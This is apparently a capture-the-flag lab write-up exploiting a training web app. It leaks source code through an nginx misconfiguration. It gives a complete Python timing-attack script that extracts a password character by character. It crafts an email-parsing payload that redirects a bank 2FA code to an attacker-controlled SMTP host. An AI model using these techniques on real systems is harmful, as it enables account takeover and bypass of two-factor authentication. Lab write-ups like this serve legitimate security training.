# BreachBlocker Unclocker


**sq4.png**

- We have downloaded the malware from the site.
- It contains a large base64 data. On decoding, we found a PowerShell script.
- The script contains a variable $d, which has a large base64 data. 
- In the last, the script is running a for loop against the variable d$ to perform an XOR operation. and sends the results to a URL, so I modified the code to save it on my machine. I got a PNG file. 

- sq4 = throne123*


## Recon

```
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp     Postfix smtpd
| smtp-commands: hostname, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
|_ 2.0.0 Commands: AUTH BDAT DATA EHLO ETRN HELO HELP MAIL NOOP QUIT RCPT RSET STARTTLS VRFY XCLIENT XFORWARD 
844343/tcp open  ssl/http nginx 1.29.3
|_http-server-header: nginx/1.29.3
|_http-title: Mobile Portal
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2025-12-11T05:00:31
|_Not valid after:  2026-12-11T05:00:31
| tls-alpn: 
|   h2
|_  http/1.1
```

## First Flag

This URL gives an interface to the mobile
https://10.48.142.96:8443/ 

- Didn't find anything on the mobile interface 

```
ffuf -u https://10.48.190.17:8443/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt 
```

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.48.190.17:8443/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

nginx.conf              [Status: 200, Size: 890, Words: 226, Lines: 32, Duration: 45ms]
:: Progress: [2565/2565] :: Job [1/1] :: 269 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

- found an nginx.conf file
```
user  nginx;
worker_processes 4;
error_log  /var/log/nginx/error.log warn;
pid        /var/run/nginx.pid;
events {
    worker_connections 2048;
}
http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;
    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';
    access_log  /var/log/nginx/access.log  main;
    sendfile        on;
    keepalive_timeout  300;
    server {
        listen 443 ssl http2;
	ssl_certificate /app/server.cert;
	ssl_certificate_key /app/server.key;
	ssl_protocols TLSv1.2;
        location / {
            try_files $uri @app;
        }
        location @app {
            include uwsgi_params;
            uwsgi_pass unix:///tmp/uwsgi.sock;
        }
    }
}
daemon off;
```

- You can see the try_files part in the end. What it is actually doing is. When the server receives a request, it checks whether the file exists or not. If the file exists, it directly serves it from the disk or forwards the request to the @app handler. 

- so we can read any files on the disk if we can guess the file name. 
- As it is a Python application, let's try some file names like app.py, main.py, etc.

```
GET /main.py HTTP/2
Host: 10.48.190.17:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Dnt: 1
Sec-Gpc: 1
Referer: https://10.48.190.17:8443/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
If-Modified-Since: Sun, 21 Dec 2025 09:44:52 GMT
If-None-Match: "1766310292.0-616948-844039662"
Priority: u=5, i
Te: trailers
```

- We got 200 for main.py in the source code, we can find the first flag.
```
HTTP/2 200 OK
Server: nginx/1.29.3
Content-Type: text/x-python; charset=utf-8
Content-Length: 6514
Content-Disposition: inline; filename=main.py
Last-Modified: Sun, 21 Dec 2025 10:51:53 GMT
Cache-Control: no-cache
Etag: "1766314313.0-6514-561120441"
Date: Tue, 06 Jan 2026 14:27:30 GMT

from flask import Flask, request, jsonify, send_from_directory, session
import time
import random
import os
import hashlib
import time
import smtplib
import sqlite3
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

connection = sqlite3.connect("/hopflix-874297.db")
cursor = connection.cursor()

connection2 = sqlite3.connect("/hopsecbank-12312497.db")
cursor2 = connection2.cursor()

app = Flask(__name__)
app.secret_key = os.getenv('SECRETKEY')

aes_key = bytes(os.getenv('AESKEY'), "utf-8")

# Credentials (server-side only)
HOPFLIX_FLAG = os.getenv('HOPFLIX_FLAG')
BANK_ACCOUNT_ID = "hopper"
BANK_PIN = os.getenv('BANK_PIN')
BANK_FLAG = os.getenv('BANK_FLAG')
#CODE_FLAG = THM{eggsposed_source_code}

def encrypt(plaintext):
    cipher = AES.new(aes_key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode('utf-8'))
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode('utf-8')

def decrypt(encrypted_data):
    decoded_data = base64.b64decode(encrypted_data.encode('utf-8'))
    nonce_len = 16
    tag_len = 16
    nonce = decoded_data[:nonce_len]
    tag = decoded_data[nonce_len:nonce_len + tag_len]
    ciphertext = decoded_data[nonce_len + tag_len:]

    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    plaintext_bytes = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext_bytes.decode('utf-8')

def validate_email(email):
    if '@' not in email:
        return False
    if any(ord(ch) <= 32 or ord(ch) >=126 or ch in [',', ';'] for ch in email):
        return False

    return True

def send_otp_email(otp, to_addr):
    if not validate_email(to_addr):
        return -1

    allowed_emails= session['bank_allowed_emails']
    allowed_domains= session['bank_allowed_domains']
    domain = to_addr.split('@')[-1]
    if domain not in allowed_domains and to_addr not in allowed_emails:
        return -1

    from_addr = 'no-reply@hopsecbank.thm'
    message = f"""\
    Subject: Your OTP for HopsecBank

    Dear you,
    The OTP to access your banking app is {otp}.

    Thanks for trusting Hopsec Bank!"""

    s = smtplib.SMTP('smtp')
    s.sendmail(from_addr, to_addr, message)
    s.quit()


def hopper_hash(s):
    res = s
    for i in range(5000):
        res = hashlib.sha1(res.encode()).hexdigest()
    return res

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('.', path)

@app.route('/api/check-credentials', methods=['POST'])
def check_credentials():
    data = request.json
    email = str(data.get('email', ''))
    pwd = str(data.get('password', ''))
    
    rows = cursor.execute(
        "SELECT * FROM users WHERE email = ?",
        (email,),
    ).fetchall()

    if len(rows) != 1:
        return jsonify({'valid':False, 'error': 'User does not exist'})
    
    phash = rows[0][2]
    
    if len(pwd)*40 != len(phash):
        return jsonify({'valid':False, 'error':'Incorrect Password'})

    for ch in pwd:
        ch_hash = hopper_hash(ch)
        if ch_hash != phash[:40]:
            return jsonify({'valid':False, 'error':'Incorrect Password'})
        phash = phash[40:]
    
    session['authenticated'] = True
    session['username'] = email
    return jsonify({'valid': True})

@app.route('/api/get-last-viewed', methods=['GET'])
def get_bank_account_id():
    if not session.get('authenticated', False):
        return jsonify({'error': 'Unauthorized'}), 401
    return jsonify({'last_viewed': HOPFLIX_FLAG})

@app.route('/api/bank-login', methods=['POST'])
def bank_login():
    data = request.json
    account_id = str(data.get('account_id', ''))
    pin = str(data.get('pin', ''))
    
    # Check bank credentials
    rows = cursor2.execute(
        "SELECT * FROM users WHERE email = ?",
        (account_id,),
    ).fetchall()

    if len(rows) != 1:
        return jsonify({'valid':False, 'error': 'User does not exist'})
    
    phash = rows[0][2]
    if hashlib.sha256(pin.encode()).hexdigest().lower() == phash:
        session['bank_authenticated'] = True
        session['bank_2fa_verified'] = False
        session['bank_allowed_emails'] = rows[0][5].split(',')
        session['bank_allowed_domains'] = rows[0][6].split(',')
        
        if len(session['bank_allowed_emails']) > 0:
            return jsonify({
                'success': True,
                'requires_2fa': True,
                'trusted_emails': rows[0][5].split(','),
            })
        if len(session['bank_allowed_domains']) > 0:
            return jsonify({
                'success': True,
                'requires_2fa': True,
                'trusted_domains': rows[0][6].split(','),
            })
    else:
        return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/send-2fa', methods=['POST'])
def send_2fa():
    data = request.json
    otp_email = str(data.get('otp_email', ''))
    
    if not session.get('bank_authenticated', False):
        return jsonify({'error': 'Access denied.'}), 403
    
    # Generate 2FA code
    two_fa_code = ''.join([str(random.randint(0, 9)) for _ in range(6)])
    session['bank_2fa_code'] = encrypt(two_fa_code)

    if send_otp_email(two_fa_code, otp_email) != -1:
        return jsonify({'success': True})
    else:
        return jsonify({'success': False})

@app.route('/api/verify-2fa', methods=['POST'])
def verify_2fa():
    data = request.json
    code = str(data.get('code', ''))
    
    if not session.get('bank_authenticated', False):
        return jsonify({'error': 'Access denied.'}), 403
    
    if not session.get('bank_2fa_code', False):
        return jsonify({'error': 'No 2FA code generated'}), 404
    
    if code == decrypt(session.get('bank_2fa_code')):
        session['bank_2fa_verified'] = True
        return jsonify({'success': True})
    else:
        if 'bank_2fa_code' in session:
            del session['bank_2fa_code']
        return jsonify({'error': 'Invalid code'}), 401

@app.route('/api/release-funds', methods=['POST'])
def release_funds():
    if not session.get('bank_authenticated', False):
        return jsonify({'error': 'Access denied.'}), 403
    if not session.get('bank_2fa_verified', False):
        return jsonify({'error': 'Access denied.'}), 403
    
    return jsonify({'flag': BANK_FLAG})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True,threaded=True)

```
- The source reveals the first flag 

**Flag = THM{eggsposed_source_code}**

## Second Flag

- As you can see, the code contains two sqlite3 .db files, hopflix-874297.db and hopsecbank-12312497.db
- But only hopflix-874297.db exists in the current directory. So I downloaded it to my local machine.

```
wget https://10.48.156.200:8443/hopflix-874297.db --no-check-certificate
```

```
sqlite> .tables
users
sqlite> select * from users;
sbreachblocker@easterbunnies.thm|Sir BreachBlocker|03c96ceff1a9758a1ea7c3cb8d43264616949d88b5914c97bdedb1ab511a85c480d49b77c4977520ebc1b24149a1fd25c37aeb2d9042d0d05492ba5c19b23990d991560019487301ef9926d9d99a2962b5914c97bdedb1ab511a85c480d49b77c49775207dc2d45214515ff55726de5fc73d5bd5500b3e86fa6c34156f954d4435e838f6852c6476217104207dc2d45214515ff55726de5fc73d5bd5500b3e86504fa1cfe6a6f5d5c407f673dd67d71a34cbb0772c21afa8b8f0b5e1c1a377b7168e542ea41f67a696e4c3dda73fa679990918ab333b6fab8c8e5f2296e56d15f089c659a1bbc1d2b6f70b6c80720f1a
sqlite> 
```

- In the users table, we can see email and password hash. But it is not a normal hash. In the main.py, we can see how the hopflix authentication is carried out.

```
def hopper_hash(s):
    res = s
    for i in range(5000):
        res = hashlib.sha1(res.encode()).hexdigest()
    return res
...
@app.route('/api/check-credentials', methods=['POST'])
def check_credentials():
    data = request.json
    email = str(data.get('email', ''))
    pwd = str(data.get('password', ''))
    
    rows = cursor.execute(
        "SELECT * FROM users WHERE email = ?",
        (email,),
    ).fetchall()

    if len(rows) != 1:
        return jsonify({'valid':False, 'error': 'User does not exist'})
    
    phash = rows[0][2]
    
    if len(pwd)*40 != len(phash):
        return jsonify({'valid':False, 'error':'Incorrect Password'})

    for ch in pwd:
        ch_hash = hopper_hash(ch)
        if ch_hash != phash[:40]:
            return jsonify({'valid':False, 'error':'Incorrect Password'})
        phash = phash[40:]
    
    session['authenticated'] = True
    session['username'] = email
    return jsonify({'valid': True})
```

- The endpoint /api/check-credentials receives our email and password in JSON format.
- Then a SQL query gets executed on the hopflix database, and stores the info in the rows variable. 
- So the rows variable contains something like this. **rows == [("email", "full_name", "password_hash")]**
- **phash = rows[0][2]** This line takes the password hash from the rows variable and stores it in a variable called phash.

```
   if len(pwd)*40 != len(phash):
        return jsonify({'valid':False, 'error':'Incorrect Password'})
```
- This part checks if pwd x (40) is not equal to len of phash, then the password is incorrect, which means the length of the password is len(phas)/40, which is 12 (we know the length of phash from the sqlite3 .db file).

```
 for ch in pwd:
        ch_hash = hopper_hash(ch)
        if ch_hash != phash[:40]:
            return jsonify({'valid':False, 'error':'Incorrect Password'})
        phash = phash[40:]
```
- This block of code takes each character of the password and runs a function hopper_hash() on it. Then check the char_hash with the phash first 40 characters.

- Take a look at the hopper_hash() function
```   
def hopper_hash(s):
    res = s
    for i in range(5000):
        res = hashlib.sha1(res.encode()).hexdigest()
    return res
```

- now it makes sense, it takes each chat and encodes it, runs sha1 on it, then hexdigests it. 
- This process runs 5000 times. 
- The output of each character is 40. This is the reason it compares each char_hash with the first 40 chars of the phash.

- Initially, I tried brute forcing the password, but it didn't work. don't know the reason. But later found that the application was checking one character at a time. There might be a time-based attack that is possible. 

```
import requests
import time
import statistics
import string
import urllib3

# Disable SSL warnings for self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
TARGET_URL = "https://10.48.156.200:8443/api/check-credentials"
EMAIL = "sbreachblocker@easterbunnies.thm"
PASSWORD_LENGTH = 12  # Based on hash length: 480/40 = 12 characters
SAMPLES_PER_CHAR = 25  # Number of timing samples per character attempt
CHARSET = list(string.ascii_lowercase)

def measure_response_time(password):
    """Measure the time taken for a login attempt"""
    data = {
        "email": EMAIL,
        "password": password
    }
    
    start = time.perf_counter()
    try:
        response = requests.post(
            TARGET_URL,
            json=data,
            verify=False,  # Ignore SSL certificate
            timeout=30
        )
        end = time.perf_counter()
        return end - start, response.status_code, response.json()
    except Exception as e:
        print(f"    [!] Error: {e}")
        return 0, None, None

def test_character_at_position(known_password, position, charset):
    """Test all characters at a specific position using timing attack"""
    print(f"\n[*] Testing position {position + 1}/{PASSWORD_LENGTH}")
    print(f"    Known so far: '{known_password}' + {'?' * (PASSWORD_LENGTH - len(known_password))}")
    print("-" * 70)
    
    timing_results = {}
    
    # Test each character multiple times
    for char_idx, char in enumerate(charset):
        # Build test password: known_password + test_char + padding
        padding_length = PASSWORD_LENGTH - len(known_password) - 1
        # Use 'X' as padding (arbitrary choice)
        test_password = known_password + char + ('X' * padding_length)
        
        # Take multiple samples to account for network jitter
        times = []
        for sample in range(SAMPLES_PER_CHAR):
            response_time, status_code, response_data = measure_response_time(test_password)
            times.append(response_time)
            
            # Check if we accidentally got the right password
            if response_data and response_data.get('valid'):
                print(f"\n{'='*70}")
                print(f"PASSWORD FOUND!")
                print(f"Password: {test_password}")
                print(f"{'='*70}")
                return test_password, True

        avg_time = statistics.mean(times)
        std_dev = statistics.stdev(times) if len(times) > 1 else 0
        timing_results[char] = {
            'avg': avg_time,
            'std': std_dev,
            'samples': times
        }
        
        # Show progress
        char_display = repr(char) if char in '\n\r\t' else char
        print(f"    [{char_idx+1:3d}/{len(charset)}] '{char_display}' -> "
              f"avg: {avg_time*1000:.2f}ms, std: {std_dev*1000:.2f}ms", end='\r')
    
    print()
    
    # Sort by average time (longest = most likely correct)
    sorted_results = sorted(timing_results.items(), key=lambda x: x[1]['avg'], reverse=True)
    
    # Show top 5 candidates
    print(f"\n    Top 5 slowest (most likely correct):")
    for i, (char, data) in enumerate(sorted_results[:5]):
        char_display = repr(char) if char in '\n\r\t' else char
        print(f"      {i+1:2d}. '{char_display}' -> {data['avg']*1000:.2f}ms (±{data['std']*1000:.2f}ms)")
    
    # Return the slowest character (most likely correct)
    best_char = sorted_results[0][0]
    best_time = sorted_results[0][1]['avg']
    
    print(f"\n    [✓] Selected: '{best_char}' (took {best_time*1000:.2f}ms)")
    
    return best_char, False

def timing_attack():
    """Perform timing attack to extract password character by character"""
    discovered_password = ""
    
    for position in range(PASSWORD_LENGTH):
        char, found_complete = test_character_at_position(discovered_password, position, CHARSET)
        
        if found_complete:
            # We accidentally found the complete password
            return char
        
        discovered_password += char
        
        print(f"\n{'='*70}")
        print(f"Password so far: {discovered_password}")
        print(f"{'='*70}")
        
    return discovered_password
    
if __name__ == "__main__":
    try:
        
        final_password = timing_attack()
        
        print(f"\n{'='*70}")
        print(f"ATTACK COMPLETE!")
        print(f"{'='*70}")
        print(f"Discovered password: {final_password}")
        print(f"Length: {len(final_password)} characters")
        print(f"\nTesting discovered password...")
        response_time, status_code, response_data = measure_response_time(final_password)
        
        if response_data and response_data.get('valid'):
            print(f"[✓] PASSWORD VERIFIED! Login successful!")
        else:
            print(f"[X] Password may be incorrect. Response: {response_data}")
        
        print(f"{'='*70}")
        
    except KeyboardInterrupt:
        print(f"\n\n[!] Attack interrupted by user")
```
***NOTE: Run the code in Attackbox, not on your local machine, because time-based attacks are so sensitive that the vpn delay may cause some  kind of issue***

```
======================================================================
PASSWORD FOUND!
Password: malharerocks
======================================================================

======================================================================
ATTACK COMPLETE!
======================================================================
Discovered password: malharerocks
Length: 12 characters

Testing discovered password...
[] PASSWORD VERIFIED! Login successful!
======================================================================
```
- Email **sbreachblocker@easterbunnies.thm**
- The password is **malharerocks**
- Enter the password you get flag on the last seen.

**Flag = THM{fluffier_things_season_4}**

## Third Flag

- I tried the same creds for the banking app too. You know what it worked.
-  mechanism to release funds.
  					1. You enter creds
					2. You are prompted to select an email
					3. The email receives an otp 
					4. Enter the otp to release funds

- You can see from main.py that send_otp_email() function. It contains the main flaw.


```
def send_otp_email(otp, to_addr):
    if not validate_email(to_addr):
        return -1

    allowed_emails= session['bank_allowed_emails']
    allowed_domains= session['bank_allowed_domains']
    domain = to_addr.split('@')[-1]
    if domain not in allowed_domains and to_addr not in allowed_emails:
        return -1

    from_addr = 'no-reply@hopsecbank.thm'
    message = f"""\
    Subject: Your OTP for HopsecBank

    Dear you,
    The OTP to access your banking app is {otp}.

    Thanks for trusting Hopsec Bank!"""

    s = smtplib.SMTP('smtp')
    s.sendmail(from_addr, to_addr, message)
    s.quit()
```

- Here, the code is actually checking the domain with a white list of domains. 
- It splits the email at @, then takes the domain name and compares it with the list of allowed domains.

```
if False and to_addr not in allowed_emails:
```
- This line allows the function to continue, regardless of the actual destination address. if the domain matches in our case **easterbunnies.thm**
- This can be bypassed by some SMTP parsing tricks. 
- Found this article on [PortSwigger](https://portswigger.net/research/splitting-the-email-atom), have a look at it 

**To Exploit this**

- I crafted a payload that points to my own SMTP server. 
- For this, I am going to use **aiosmtpd** Python tool, to set up a SMTP server.

```
pip install aiosmtpd

```

- Setting up a local SMTP server 

```
aiosmtpd -n -l 192.168.136.147:25
```
- From the above PortSwigger article, it explained how the character "(" can comment out part of an email address. 
- We are going to use this to craft an email that points to our SMTP.

**Crafted Email**
```
wick@[192.168.136.147](@easterbunnies.thm
```

- Start Burp Suite and turn intercept on
- Enter the creds and press enter, let the request pass.
- Then intercept the send-2fa request and change the email to the crafted email 
```
POST /api/send-2fa HTTP/2
Host: 10.48.171.254:8443
Cookie: session=.eJxtjjEOAjEMBP_i-kRBeRX_QCjyXTaKReJIjgMF4u8cIFEA9cyO9kYL6znsE4cLTJIg0py4dExvwqW0K2KIrbJop_lI4O6wZagK-s5zpdOXjM0tL3dls-YbxOF3NlHlktn-sU9yeIa6rOzPa24D9wf090PZ.aV3pVQ.NS-Rms7cxfMa6MQvwXX6m6b0HbE
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://10.48.171.254:8443/
Content-Type: application/json
Content-Length: 44
Origin: https://10.48.171.254:8443
Dnt: 1
Sec-Gpc: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"otp_email":"wick@[192.168.136.147](@easterbunnies.thm"}
```
- Forward the request 

- Then we receive an otp email at our SMTP server 
```
---------- MESSAGE FOLLOWS ----------
Received: from [172.18.0.2] (sq5_app-v2_1.sq5_default [172.18.0.2])
	by hostname (Postfix) with ESMTP id 8048CFAA72
	for <wick@[192.168.136.147]>; Wed, 07 Jan 2026 05:03:45 +0000 (UTC)
X-Peer: ('10.48.171.254', 48464)

    Subject: Your OTP for HopsecBank

    Dear you,
    The OTP to access your banking app is 531247.

    Thanks for trusting Hopsec Bank!
------------ END MESSAGE ------------
```
- Enter the otp and then release funds, we get the flag

**Flag=THM{neggative_balance}**

